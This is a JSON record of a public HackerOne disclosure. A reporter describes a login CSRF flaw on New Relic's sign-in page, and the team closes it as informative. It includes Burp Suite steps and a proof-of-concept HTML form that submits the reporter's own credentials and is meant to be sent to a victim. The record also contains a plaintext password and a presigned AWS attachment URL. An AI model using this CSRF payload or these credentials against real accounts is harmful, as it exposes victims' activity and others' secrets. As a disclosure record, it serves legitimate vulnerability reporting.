{"id":156992,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTY5OTI=","url":"https://hackerone.com/reports/156992","title":"Login CSRF vulnerability","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2016-08-06T01:29:16.098Z","submitted_at":"2016-08-06T01:29:16.098Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jackcyril","url":"/jackcyril","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/087/742/5cb38176a9a16d806d72e9f5c244daa07c12fa68_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-08-12T23:30:56.458Z","bug_reporter_agreed_on_going_public_at":"2016-08-09T01:58:20.319Z","team_member_agreed_on_going_public_at":"2016-08-12T23:30:56.371Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi New Relic security team,\n\nWhile doing pentesting on your website, I found that while logging into the account  the \"authenticity_token\" was not properly validated. I was able to login into my account even without \"authenticity_token\".\n\nImpact: High\n\nSteps to Reproduce:\n\n1) Login to your account.\n2) While logging in make sure that the intercept is on in your burp suite.\n3) In burp suite, you can view the request you made after clicking on sign in.\n4) In the request, you'll find the \"authenticity_token\" parameter.\n5) Now, remove the value which is there in the \"authenticity_token\" parameter.\n6) And now forward the packet and off the interception in burp suite.\n7) Now, you'll successfully able to login without CSRF or authenticity_token.\n\nPoC: \n\n1) Copy the below code to the notepad and save it in the .html format.\n\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://login.newrelic.com/login?return_to=https%3A%2F%2Frpm.newrelic.com%2Fauth%2Fnewrelic%3Forigin%3Dhttps%253A%252F%252Frpm.newrelic.com%252Faccounts%252F1397211%252Fsetup\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"utf8\" value=\"â\u0026#156;\u0026#147;\" /\u003e\n      \u003cinput type=\"hidden\" name=\"authenticity\u0026#95;token\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"return\u0026#95;to\" value=\"https\u0026#58;\u0026#47;\u0026#47;rpm\u0026#46;newrelic\u0026#46;com\u0026#47;auth\u0026#47;newrelic\u0026#63;origin\u0026#61;https\u0026#37;3A\u0026#37;2F\u0026#37;2Frpm\u0026#46;newrelic\u0026#46;com\u0026#37;2Faccounts\u0026#37;2F1397211\u0026#37;2Fsetup\" /\u003e\n      \u003cinput type=\"hidden\" name=\"login\u0026#91;email\u0026#93;\" value=\"jackcyril007\u0026#64;gmail\u0026#46;com\" /\u003e\n      \u003cinput type=\"hidden\" name=\"login\u0026#91;password\u0026#93;\" value=\"90sh\u0026#64;n12345\" /\u003e\n      \u003cinput type=\"hidden\" name=\"login\u0026#91;remember\u0026#95;me\u0026#93;\" value=\"0\" /\u003e\n      \u003cinput type=\"hidden\" name=\"commit\" value=\"Sign\u0026#32;in\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n\n2) Send this file to the victim and when the victim clicks on submit button in the victims browser, the  victim will now be able to login with the attackers login credentials.\n\n3) And after that an attacker can later log into the site with his/her legitimate credentials and view private information like activity history of the victim that has been saved in the account.\n\n\nMitigation:\n\nPlease refer the following link:\n\nhttps://www.owasp.org/index.php/CSRF_Prevention_Cheat_Sheet\n\n\n\n\nThank you,\nPraseudo\n\n\n","vulnerability_information_html":"\u003cp\u003eHi New Relic security team,\u003c/p\u003e\n\n\u003cp\u003eWhile doing pentesting on your website, I found that while logging into the account  the \u0026quot;authenticity_token\u0026quot; was not properly validated. I was able to login into my account even without \u0026quot;authenticity_token\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eImpact: High\u003c/p\u003e\n\n\u003cp\u003eSteps to Reproduce:\u003c/p\u003e\n\n\u003cp\u003e1) Login to your account.\u003cbr\u003e\n2) While logging in make sure that the intercept is on in your burp suite.\u003cbr\u003e\n3) In burp suite, you can view the request you made after clicking on sign in.\u003cbr\u003e\n4) In the request, you\u0026#39;ll find the \u0026quot;authenticity_token\u0026quot; parameter.\u003cbr\u003e\n5) Now, remove the value which is there in the \u0026quot;authenticity_token\u0026quot; parameter.\u003cbr\u003e\n6) And now forward the packet and off the interception in burp suite.\u003cbr\u003e\n7) Now, you\u0026#39;ll successfully able to login without CSRF or authenticity_token.\u003c/p\u003e\n\n\u003cp\u003ePoC: \u003c/p\u003e\n\n\u003cp\u003e1) Copy the below code to the notepad and save it in the .html format.\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;https://login.newrelic.com/login?return_to=https%3A%2F%2Frpm.newrelic.com%2Fauth%2Fnewrelic%3Forigin%3Dhttps%253A%252F%252Frpm.newrelic.com%252Faccounts%252F1397211%252Fsetup\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;utf8\u0026quot; value=\u0026quot;â\u0026amp;#156;\u0026amp;#147;\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;authenticity\u0026amp;#95;token\u0026quot; value=\u0026quot;\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;return\u0026amp;#95;to\u0026quot; value=\u0026quot;https\u0026amp;#58;\u0026amp;#47;\u0026amp;#47;rpm\u0026amp;#46;newrelic\u0026amp;#46;com\u0026amp;#47;auth\u0026amp;#47;newrelic\u0026amp;#63;origin\u0026amp;#61;https\u0026amp;#37;3A\u0026amp;#37;2F\u0026amp;#37;2Frpm\u0026amp;#46;newrelic\u0026amp;#46;com\u0026amp;#37;2Faccounts\u0026amp;#37;2F1397211\u0026amp;#37;2Fsetup\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;login\u0026amp;#91;email\u0026amp;#93;\u0026quot; value=\u0026quot;jackcyril007\u0026amp;#64;gmail\u0026amp;#46;com\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;login\u0026amp;#91;password\u0026amp;#93;\u0026quot; value=\u0026quot;90sh\u0026amp;#64;n12345\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;login\u0026amp;#91;remember\u0026amp;#95;me\u0026amp;#93;\u0026quot; value=\u0026quot;0\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;commit\u0026quot; value=\u0026quot;Sign\u0026amp;#32;in\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003e2) Send this file to the victim and when the victim clicks on submit button in the victims browser, the  victim will now be able to login with the attackers login credentials.\u003c/p\u003e\n\n\u003cp\u003e3) And after that an attacker can later log into the site with his/her legitimate credentials and view private information like activity history of the victim that has been saved in the account.\u003c/p\u003e\n\n\u003cp\u003eMitigation:\u003c/p\u003e\n\n\u003cp\u003ePlease refer the following link:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.owasp.org/index.php/CSRF_Prevention_Cheat_Sheet\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FCSRF_Prevention_Cheat_Sheet\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/index.php/CSRF_Prevention_Cheat_Sheet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\nPraseudo\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":110028,"file_name":"Report1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/110/028/afd04aabf7c005244db0c20db2ae47c39fb67850/Report1.png?response-content-disposition=attachment%3B%20filename%3D%22Report1.png%22%3B%20filename%2A%3DUTF-8%27%27Report1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3MMGRP5H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043528Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICEZ9R%2B2RJ3GrTP6l%2FPAFADJG1t55InVtXNQpLfOPgHaAiEA9vebVe9XdCpFDuGnxxWe2Ve48e%2FtAoig8YYxqZ7es78qtAMIUhABGgwwMTM2MTkyNzQ4NDkiDH6RMqd3Km1HzDzcXiqRAw9Zi9Zyah%2FL7m5qi9w2XsNDr%2F5ZZ%2F5Gny1bCMAgWHuEH9Lmtzfddi67Q3u82zHSnheCFLE%2BUTr6KCbyVouh2s6I1Iw5FpZ4LCl2Jts%2FOYIW3f51kFQhZ3sOfoeJ95jG2hfROCEhzpnA30iPS6xMNw87KO9Qo4x%2FBM37CIhv4A0%2FSU0JbwvczB01wva%2FQJkiH6lH1ZVS3EG6yUh%2Feq8kDGf%2FnGRgLcxw3MK7jT4GG1knwEEDIQOAuumsmWt3QDUH6dFWYx57C2QS76Xr1I1ub7Ob050enItoD3hnXR1F2lhC9JZWyDDS3sRTHvPx0voGVfuM803u8XTKLOZxTNSBY1S8m7RRU55us25%2BTyEe9Q6J6l3ZXKJZ8Jv02FW7RtNRHdPm0L6O0I3vOQbn8GiBG%2FkhDZRW3AOAiJuB4Bhd6Ns7j3YXA9nKlctO1uYmAj%2B6nssjBtl1lKabSm0eGuk7Feh%2B9jG%2BgpNFzxS0iYgysVfwkvplnvmKgReLAD4JvjZ9sdbv66UX5MyW9gDVXf0wfna3MN2Fqv8FOusBFyKfufPYQYGFwO4tvl1lihdDkLnCZcRwmXrB0gYZzbAneLC1UJ9NimBCebx3LEek%2BJ0J1MdqCNRGrLEY92gh38wj7A61ZNLFh9KTVAiyEFWLju0gH5kr3ndnXguXCxD19p54ZTSuYzlTQ9ArEyfvPBo%2F%2BWy25KkCTRlm376pduEzwhG4%2FgpY13ZbeNcDXcGVf2lvpy33oGJqXFcfCgWJYbDCm0M%2FBGBrkOhnizXl7hE2kfO2aQgP2N8b5LucE1O2Tl%2B%2B7ABCWc7Sl7RPhipBfTbyd%2FEfgt9ObkPFxAc0xnS36iwoGt1oKkhotg%3D%3D\u0026X-Amz-Signature=723cad6ba67e9469dbc07c25a3bd5180e54c1c5df54ac44e47a6b8343b1575f8","file_size":83336,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["flex0geek","dyabla","vgr6479"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1111714,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nAny update on this???","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eAny update on this???\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-08T02:48:02.712Z","updated_at":"2016-08-08T02:48:02.712Z","actor":{"username":"jackcyril","cleared":false,"url":"/jackcyril","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/087/742/5cb38176a9a16d806d72e9f5c244daa07c12fa68_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1113871,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks for your report. We don't consider this a vulnerability, but more of a best practice. We will consider implementing your suggestion. ","markdown_message":"\u003cp\u003eThanks for your report. We don\u0026#39;t consider this a vulnerability, but more of a best practice. We will consider implementing your suggestion. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-08T23:56:10.127Z","updated_at":"2016-08-08T23:56:10.127Z","actor":{"username":"mlapworth","cleared":false,"url":"/mlapworth","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1113997,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-09T01:58:20.373Z","updated_at":"2016-08-09T01:58:20.373Z","first_to_agree":true,"actor":{"username":"jackcyril","cleared":false,"url":"/jackcyril","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/087/742/5cb38176a9a16d806d72e9f5c244daa07c12fa68_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1118788,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you disclose this report publicly.","markdown_message":"\u003cp\u003eCan you disclose this report publicly.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-11T07:56:32.465Z","updated_at":"2016-08-11T07:56:32.465Z","actor":{"username":"jackcyril","cleared":false,"url":"/jackcyril","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/087/742/5cb38176a9a16d806d72e9f5c244daa07c12fa68_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1124339,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-12T23:30:56.432Z","updated_at":"2016-08-12T23:30:56.432Z","actor":{"username":"imelven","cleared":false,"url":"/imelven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1124340,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-12T23:30:56.496Z","updated_at":"2016-08-12T23:30:56.496Z","actor":{"username":"imelven","cleared":false,"url":"/imelven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}